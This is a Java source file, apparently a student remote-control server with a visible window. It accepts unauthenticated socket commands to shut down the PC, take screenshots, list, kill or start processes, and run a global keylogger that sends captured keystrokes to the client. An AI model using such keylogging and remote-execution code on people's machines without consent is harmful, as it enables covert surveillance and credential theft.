package org.example;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import javax.swing.*;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JButton;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.*;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.Objects;
import java.io.*;
import java.awt.*;

public class server extends JFrame {
    private JPanel contentPane;
    private JButton buttonOK;
    public JLabel ipFieldShow;
    private JLabel ipTextField;
    public static String s;
    public static String ss;
    public static BufferedImage bimg;
    public static boolean KeylogStatus = false;
    public static boolean KeylogRun = false;

    // Define output string
    public static final String stopTheProcessSuccessfully = "The process stop successfully.";
    public static final String pidIsWrong = "PID is wrong. Please input again...";
    public static final String anErrorHappened = "An error happened. Errorcode: ";
    public static final String theProcessStartSuccessfully = "The process start successfully.";
    public static final String theProcessStartUnsuccessfully = "The process start unsuccessfully. Errorcode: ";
    // End output string define

    public void InitializeComponent() {
        String ipText = null;
        try {
            ipText = Inet4Address.getLocalHost().getHostAddress();
        } catch (IOException e) {
            e.printStackTrace();
        }

        setContentPane(contentPane);
        getRootPane().setDefaultButton(buttonOK);
        this.setResizable(false);
        this.pack();
        this.setTitle("Server Form");
        this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        ipFieldShow.setText("Local IP: " + ipText);
        buttonOK.addActionListener(e -> button1_Click());
    }

    public server() {
        InitializeComponent();
    }

    public void shutdown() {
        try {
            Runtime.getRuntime().exec("shutdown -s -t 00");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void receiveSignalFun() {
        try {
            ss = Program.is.readLine();
        } catch (IOException e) {
            ss = "QUIT";
            e.printStackTrace();
        }
    }

    public void takepic() {
        while (true) {
            receiveSignalFun();
            System.out.println(ss);
            switch (ss) {
                case "TAKE" -> {
                    try {
                        Robot bot = new Robot();
                        bimg = bot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        ImageIO.write(bimg, "PNG", baos);
                        baos.close();
                        ObjectOutputStream oos = new ObjectOutputStream(Program.socketOfClient.getOutputStream());
                        oos.writeObject(baos.size() + "");
                        Program.socketOfClient.getOutputStream().write(baos.toByteArray());
                        System.out.println("Screenshot sent");
                    } catch (AWTException awte) {
                        awte.printStackTrace();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                }
                case "QUIT" -> {
                    return;
                }
            }
        }
    }

    public boolean checkProcessIsApplication(String input) {
        String[] temp1 = input.split("");
        return !Objects.equals(temp1[0], "\"") || !Objects.equals(temp1[1], "\"") || !Objects.equals(temp1[2], ",");
    }

    public void keylog() {
        while (true) {
            receiveSignalFun();
            System.out.println(ss);
            switch (ss) {
                case "PRINT" -> printkeys();
                case "HOOK" -> hookKey();
                case "UNHOOK" -> unhook();
                case "QUIT" -> {
                    unhook();
                    return;
                }
            }
        }
    }

    private void printkeys() {
        try {
            Program.os.write(Keylog.keylogStringBuffer.toString());
            Program.os.newLine();
            Program.os.flush();
            Program.os.write("[END_OF_STRING_BUFFER]");
            Program.os.newLine();
            Program.os.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void hookKey() {
        if (!KeylogStatus) {
            if (!KeylogRun)
            {
                Keylog.run();
                KeylogRun = true;
            }
            else {
                try {
                    GlobalScreen.registerNativeHook();
                } catch (NativeHookException e) {
                    throw new RuntimeException(e);
                }
            }
            KeylogStatus = true;
        } else {
            System.out.println("Keylog is running...");
        }
    }

    private void unhook() {
        if (KeylogStatus) {
            Keylog.unRun();
//            t1.stop();
            KeylogStatus = false;
        } else {
            System.out.println("Keylog is not running...");
        }
    }


    public void application() {
        while (true) {
            receiveSignalFun();
            System.out.println(ss);
            switch (ss) {
                case "XEM" -> {
                    try {
                        String line;

                        // Command process
                        String command = "powershell.exe Get-Process | Select MainWindowTitle,ProcessName,Id,HandleCount | ConvertTo-Csv -NoTypeInformation";
                        Process powerShellProcess = Runtime.getRuntime().exec(command);
                        powerShellProcess.getOutputStream().close();
                        BufferedReader input = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));
                        line = input.readLine();
                        while ((line = input.readLine()) != null) {
                            if (checkProcessIsApplication(line)) {
                                String tempOfLine = line.substring(1);
                                Program.os.write(tempOfLine.substring(tempOfLine.indexOf("\"") + 2));
                                Program.os.newLine();
                                Program.os.flush();
                            }
                        }
                        Program.os.write("END_OF_SERVER_LIST");
                        Program.os.newLine();
                        Program.os.flush();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                }
                case "KILL" -> {
                    boolean test01 = true;
                    while (test01) {
                        receiveSignalFun();
                        switch (ss) {
                            case "KILLID" -> {
                                try {
                                    String u;
                                    u = Program.is.readLine();
                                    boolean test02 = false;
                                    String errorcode = "";
                                    if (!Objects.equals(u, "") | isNumeric(u)) {
                                        Process commandRun = Runtime.getRuntime().exec("TASKKILL /PID " + u);
                                        BufferedReader r = new BufferedReader(new InputStreamReader(commandRun.getInputStream()));
                                        BufferedReader rr = new BufferedReader(new InputStreamReader(commandRun.getErrorStream()));
                                        String s = r.readLine();
                                        if (s != null) {
                                            Program.os.write(stopTheProcessSuccessfully);
                                            Program.os.newLine();
                                            Program.os.flush();
                                            test02 = true;
                                        } else {
                                            errorcode = rr.readLine();
                                            errorcode = errorcode.substring(7);
                                        }
                                    } else {
                                        errorcode = pidIsWrong;
                                    }

                                    if (!test02) {
                                        Program.os.write(anErrorHappened + errorcode);
                                        Program.os.newLine();
                                        Program.os.flush();
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                            case "QUIT" -> test01 = false;
                        }
                    }
                }
                case "START" -> {
                    boolean test01 = true;
                    while (test01) {
                        receiveSignalFun();
                        switch (ss) {
                            case "STARTID" -> {
                                try {
                                    String u;
                                    u = Program.is.readLine();
                                    boolean test02 = false;
                                    String errorcode = "";
                                    if (!Objects.equals(u, "")) {
                                        try {
                                            Process p = new ProcessBuilder(u).start();
                                        } catch (IOException ee) {
                                            errorcode = String.valueOf(ee);
                                        }
                                        if (Objects.equals(errorcode, "")) {
                                            Program.os.write(theProcessStartSuccessfully);
                                            Program.os.newLine();
                                            Program.os.flush();
                                            test02 = true;
                                        }
                                    }
                                    if (!test02) {
                                        Program.os.write(theProcessStartUnsuccessfully + errorcode);
                                        Program.os.newLine();
                                        Program.os.flush();
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                            case "QUIT" -> test01 = false;
                        }
                    }
                }
                case "QUIT" -> {
                    return;
                }
            }
        }
    }

    public void process() {
        while (true) {
            receiveSignalFun();
            System.out.println(ss);
            switch (ss) {
                case "XEM" -> {
                    // "BEGIN_OF_SERVER_LIST
                    try {
                        String line;
                        Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe" + " /FO CSV /NH");
                        BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        while ((line = input.readLine()) != null) {
                            Program.os.write(line);
                            Program.os.newLine();
                            Program.os.flush();
                        }
                        Program.os.write("END_OF_SERVER_LIST");
                        Program.os.newLine();
                        Program.os.flush();
                    } catch (Exception err) {
                        err.printStackTrace();
                    }
                }
                case "KILL" -> {
                    boolean test01 = true;
                    while (test01) {
                        receiveSignalFun();
                        switch (ss) {
                            case "KILLID" -> {
                                try {
                                    String u;
                                    u = Program.is.readLine();
                                    boolean test02 = false;
                                    String errorcode = "";
                                    if (!Objects.equals(u, "") | isNumeric(u)) {
                                        Process commandRun = Runtime.getRuntime().exec("TASKKILL /PID " + u);
                                        BufferedReader r = new BufferedReader(new InputStreamReader(commandRun.getInputStream()));
                                        BufferedReader rr = new BufferedReader(new InputStreamReader(commandRun.getErrorStream()));
                                        String s = r.readLine();
                                        if (s != null) {
                                            Program.os.write(stopTheProcessSuccessfully);
                                            Program.os.newLine();
                                            Program.os.flush();
                                            test02 = true;
                                        } else {
                                            errorcode = rr.readLine();
                                            errorcode = errorcode.substring(7);
                                        }
                                    } else {
                                        errorcode = pidIsWrong;
                                    }

                                    if (!test02) {
                                        Program.os.write(anErrorHappened + errorcode);
                                        Program.os.newLine();
                                        Program.os.flush();
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                            case "QUIT" -> test01 = false;
                        }
                    }
                }
                case "START" -> {
                    boolean test01 = true;
                    while (test01) {
                        receiveSignalFun();
                        switch (ss) {
                            case "STARTID" -> {
                                try {
                                    String u;
                                    u = Program.is.readLine();
                                    boolean test02 = false;
                                    String errorcode = "";
                                    if (!Objects.equals(u, "")) {
                                        try {
                                            Process p = new ProcessBuilder(u).start();
                                        } catch (IOException ee) {
                                            errorcode = String.valueOf(ee);
                                        }
                                        if (Objects.equals(errorcode, "")) {
                                            Program.os.write(theProcessStartSuccessfully);
                                            Program.os.newLine();
                                            Program.os.flush();
                                            test02 = true;
                                        }
                                    }
                                    if (!test02) {
                                        Program.os.write(theProcessStartUnsuccessfully + errorcode);
                                        Program.os.newLine();
                                        Program.os.flush();
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                            case "QUIT" -> test01 = false;
                        }
                    }
                }
                case "QUIT" -> {
                    return;
                }
            }
        }
    }

    public boolean isNumeric(String str) {
        return str != null && str.matches("[0-9.]+");
    }

    public void receiveSignal() {
        try {
            s = Program.is.readLine();
        } catch (IOException e) {
            s = "QUIT";
            e.printStackTrace();
        }
    }

    public void button1_Click() {
        try {
            Program.serversocket = new ServerSocket(5656);
        } catch (IOException e0) {
            e0.printStackTrace();
            System.exit(1);
        }
        try {
            System.out.println("Server is waiting to accept user...");
            Program.socketOfClient = Program.serversocket.accept();
            System.out.println("Accept a client");
            Program.is = new BufferedReader(new InputStreamReader(Program.socketOfClient.getInputStream()));
            Program.os = new BufferedWriter(new OutputStreamWriter(Program.socketOfClient.getOutputStream()));
            respondFromClient:
            {
                while (true) {
                    receiveSignal();
                    System.out.println(s);
                    ss = "";
                    switch (s) {
                        case "SHUTDOWN" -> {
                            shutdown();
                            s = "";
                        }
                        case "TAKEPIC" -> {
                            takepic();
                            s = "";
                        }
                        case "APPLICATION" -> {
                            application();
                            s = "";
                        }
                        case "PROCESS" -> {
                            process();
                            s = "";
                        }
                        case "KEYLOG" -> {
                            keylog();
                            s = "";
                        }
                        case "QUIT" -> {
                            finish();
                            s = "";
                            break respondFromClient;
                        }
                    }
                }
            }
        } catch (IOException e) {
            try {
                finish();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    }

    public void finish() throws IOException {
        Program.serversocket.close();
        Program.socketOfServer = null;
    }
}
